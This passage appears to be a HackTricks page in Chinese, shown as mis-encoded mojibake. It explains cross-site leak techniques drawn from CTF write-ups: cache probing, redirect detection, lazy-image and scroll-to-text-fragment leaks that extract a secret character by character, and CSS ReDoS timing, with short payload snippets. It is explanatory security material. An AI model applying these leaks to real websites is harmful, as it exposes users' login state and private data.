- ç›‘è§†æ–°æ‰“å¼€çª—å£ä¸­çš„å¯¼èˆªäº‹ä»¶å¯ä»¥æ­ç¤ºæ˜¯å¦è§¦å‘äº†æ–‡ä»¶ä¸‹è½½ï¼ˆæ— å¯¼èˆªï¼‰ï¼Œæˆ–è€…å†…å®¹æ˜¯å¦å†…è”æ˜¾ç¤ºï¼ˆå‘ç”Ÿå¯¼èˆªï¼‰ã€‚

åœ¨ä»…å…è®¸ç™»å½•ç”¨æˆ·è§¦å‘æ­¤ç±»ä¸‹è½½çš„æƒ…å†µä¸‹ï¼Œè¿™äº›æŠ€æœ¯å¯ç”¨äºé—´æ¥æ¨æ–­ç”¨æˆ·çš„èº«ä»½éªŒè¯çŠ¶æ€ï¼Œæ ¹æ®æµè§ˆå™¨å¯¹ä¸‹è½½è¯·æ±‚çš„å“åº”ã€‚

### åˆ†åŒº HTTP ç¼“å­˜ç»•è¿‡ <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ iframe åŒºåˆ†æ–‡ä»¶ä¸‹è½½ï¼›iframe çš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æˆåŠŸçš„æ–‡ä»¶ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722)ï¼ˆæ¥è‡ª[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰

{% hint style="warning" %}
è¿™ç§æŠ€æœ¯ä¹‹æ‰€ä»¥æœ‰è¶£ï¼šChrome ç°åœ¨å…·æœ‰ **ç¼“å­˜åˆ†åŒº**ï¼Œæ–°æ‰“å¼€é¡µé¢çš„ç¼“å­˜é”®æ˜¯ï¼š`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`ï¼Œä½†å¦‚æœæˆ‘æ‰“å¼€ä¸€ä¸ª ngrok é¡µé¢å¹¶åœ¨å…¶ä¸­ä½¿ç”¨ fetchï¼Œç¼“å­˜é”®å°†æ˜¯ï¼š`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ï¼Œ**ç¼“å­˜é”®ä¸åŒ**ï¼Œå› æ­¤æ— æ³•å…±äº«ç¼“å­˜ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š[é€šè¿‡åˆ†åŒºç¼“å­˜è·å¾—å®‰å…¨æ€§å’Œéšç§æ€§](https://developer.chrome.com/blog/http-cache-partitioning/)\
ï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)çš„è¯„è®ºï¼‰
{% endhint %}

å¦‚æœç«™ç‚¹ `example.com` åŒ…å«æ¥è‡ª `*.example.com/resource` çš„èµ„æºï¼Œåˆ™è¯¥èµ„æºå°†ä¸ç›´æ¥é€šè¿‡é¡¶çº§å¯¼èˆªè¯·æ±‚èµ„æºå…·æœ‰ç›¸åŒçš„ç¼“å­˜é”®ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜é”®ç”±é¡¶çº§ _eTLD+1_ å’Œæ¡†æ¶ _eTLD+1_ ç»„æˆã€‚

ç”±äºè®¿é—®ç¼“å­˜æ¯”åŠ è½½èµ„æºæ›´å¿«ï¼Œå¯ä»¥å°è¯•æ›´æ”¹é¡µé¢ä½ç½®å¹¶åœ¨åœæ­¢åå–æ¶ˆ 20 æ¯«ç§’ï¼ˆä¾‹å¦‚ï¼‰åã€‚å¦‚æœåœæ­¢ååŸç‚¹å‘ç”Ÿäº†å˜åŒ–ï¼Œåˆ™è¡¨ç¤ºèµ„æºå·²è¢«ç¼“å­˜ã€‚\
æˆ–è€…åªéœ€å‘å¯èƒ½å·²ç¼“å­˜çš„é¡µé¢å‘é€ä¸€äº› fetch å¹¶æµ‹é‡æ‰€éœ€çš„æ—¶é—´ã€‚

### æ‰‹åŠ¨é‡å®šå‘ <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **æ‘˜è¦**ï¼šå¯ä»¥æŸ¥æ˜å¯¹ fetch è¯·æ±‚çš„å“åº”æ˜¯å¦æ˜¯é‡å®šå‘
* **ä»£ç ç¤ºä¾‹**ï¼š

![](<../.gitbook/assets/image (652).png>)

### ä½¿ç”¨ AbortController çš„ Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **æ‘˜è¦**ï¼šå¯ä»¥å°è¯•åŠ è½½èµ„æºå¹¶åœ¨åŠ è½½ä¹‹å‰ä¸­æ­¢åŠ è½½ï¼Œæ ¹æ®è§¦å‘é”™è¯¯ä¸å¦ï¼Œåˆ¤æ–­èµ„æºæ˜¯å¦å·²ç¼“å­˜ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

ä½¿ç”¨ _**
```html
<img src=/something loading=lazy >
```
å› æ­¤ï¼Œä½ å¯ä»¥**æ·»åŠ å¤§é‡çš„æ— ç”¨å­—ç¬¦**ï¼ˆä¾‹å¦‚**æˆåƒä¸Šä¸‡ä¸ª"W"**ï¼‰æ¥**å¡«å……ç½‘é¡µ**ï¼Œä½¿å…¶åœ¨ç§˜å¯†ä¿¡æ¯ä¹‹å‰æˆ–ä¹‹åæ·»åŠ ç±»ä¼¼äº`<br><canvas height="1850px"></canvas><br>`çš„å†…å®¹ã€‚\
å¦‚æœï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬çš„**æ³¨å…¥å‡ºç°åœ¨æ ‡å¿—ä¹‹å‰**ï¼Œåˆ™**å›¾åƒ**å°†ä¼š**åŠ è½½**ï¼Œä½†å¦‚æœå‡ºç°åœ¨**æ ‡å¿—ä¹‹å**ï¼Œæ ‡å¿—åŠ ä¸Šæ— ç”¨å­—ç¬¦å°†**é˜»æ­¢å…¶åŠ è½½**ï¼ˆä½ éœ€è¦è°ƒæ•´æ·»åŠ å¤šå°‘æ— ç”¨å­—ç¬¦ï¼‰ã€‚è¿™å°±æ˜¯[**è¿™ç¯‡è§£æ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ä¸­å‘ç”Ÿçš„æƒ…å†µã€‚

å¦ä¸€ä¸ªé€‰æ‹©æ˜¯ä½¿ç”¨**scroll-to-text-fragment**ï¼ˆå¦‚æœå…è®¸ï¼‰ï¼š

#### æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ

ç„¶è€Œï¼Œä½ å¯ä»¥è®©**æœºå™¨äººè®¿é—®é¡µé¢**ï¼Œä½¿ç”¨ç±»ä¼¼äº
```
#:~:text=SECR
```
æ‰€ä»¥ç½‘é¡µå°†æ˜¯è¿™æ ·çš„ï¼š**`https://victim.com/post.html#:~:text=SECR`**

å…¶ä¸­post.htmlåŒ…å«æ”»å‡»è€…çš„åƒåœ¾å­—ç¬¦å’Œå»¶è¿ŸåŠ è½½å›¾åƒï¼Œç„¶åæœºå™¨äººçš„ç§˜å¯†è¢«æ·»åŠ ã€‚

è¿™æ®µæ–‡æœ¬çš„ä½œç”¨æ˜¯è®©æœºå™¨äººè®¿é—®é¡µé¢ä¸­åŒ…å«æ–‡æœ¬`SECR`çš„ä»»ä½•æ–‡æœ¬ã€‚ç”±äºè¯¥æ–‡æœ¬æ˜¯ç§˜å¯†ï¼Œè€Œä¸”å®ƒå°±åœ¨**å›¾åƒä¸‹æ–¹**ï¼Œ**åªæœ‰åœ¨çŒœæµ‹çš„ç§˜å¯†æ­£ç¡®æ—¶å›¾åƒæ‰ä¼šåŠ è½½**ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼**é€ä¸ªå­—ç¬¦åœ°çªƒå–ç§˜å¯†**ã€‚

ä¸€äº›åˆ©ç”¨æ­¤æ¼æ´çš„ä»£ç ç¤ºä¾‹ï¼š[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### å›¾åƒå»¶è¿ŸåŠ è½½åŸºäºæ—¶é—´

å¦‚æœ**æ— æ³•åŠ è½½å¤–éƒ¨å›¾åƒ**ä»¥æŒ‡ç¤ºæ”»å‡»è€…å›¾åƒå·²åŠ è½½ï¼Œå¦ä¸€ä¸ªé€‰æ‹©æ˜¯å°è¯•**å¤šæ¬¡çŒœæµ‹å­—ç¬¦å¹¶æµ‹é‡æ—¶é—´**ã€‚å¦‚æœåŠ è½½äº†å›¾åƒï¼Œæ‰€æœ‰è¯·æ±‚å°†æ¯”æœªåŠ è½½å›¾åƒæ—¶èŠ±è´¹æ›´é•¿çš„æ—¶é—´ã€‚è¿™å°±æ˜¯åœ¨[**æ­¤è§£å†³æ–¹æ¡ˆçš„å†™ä½œä¸­ä½¿ç”¨çš„æ–¹æ³•**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **åœ¨è¿™é‡Œæ€»ç»“ï¼š**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

å¦‚æœä½¿ç”¨`jQuery(location.hash)`ï¼Œå¯ä»¥é€šè¿‡è®¡æ—¶**ç¡®å®šæŸäº›HTMLå†…å®¹æ˜¯å¦å­˜åœ¨**ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœé€‰æ‹©å™¨`main[id='site-main']`ä¸åŒ¹é…ï¼Œåˆ™æ— éœ€æ£€æŸ¥å…¶ä½™çš„**é€‰æ‹©å™¨**ï¼š
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSSæ³¨å…¥

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## é˜²å¾¡

å»ºè®®åœ¨ [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ä¸­æä¾›äº†ç¼“è§£æªæ–½ï¼ŒåŒæ—¶åœ¨ç»´åŸºçš„æ¯ä¸ªéƒ¨åˆ† [https://xsleaks.dev/](https://xsleaks.dev/) ä¹Ÿæœ‰ã€‚è¯·æŸ¥çœ‹è¿™äº›ä¿¡æ¯ä»¥äº†è§£å¦‚ä½•é˜²èŒƒè¿™äº›æŠ€æœ¯ã€‚

## å‚è€ƒèµ„æ–™

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ä¸Š**å…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
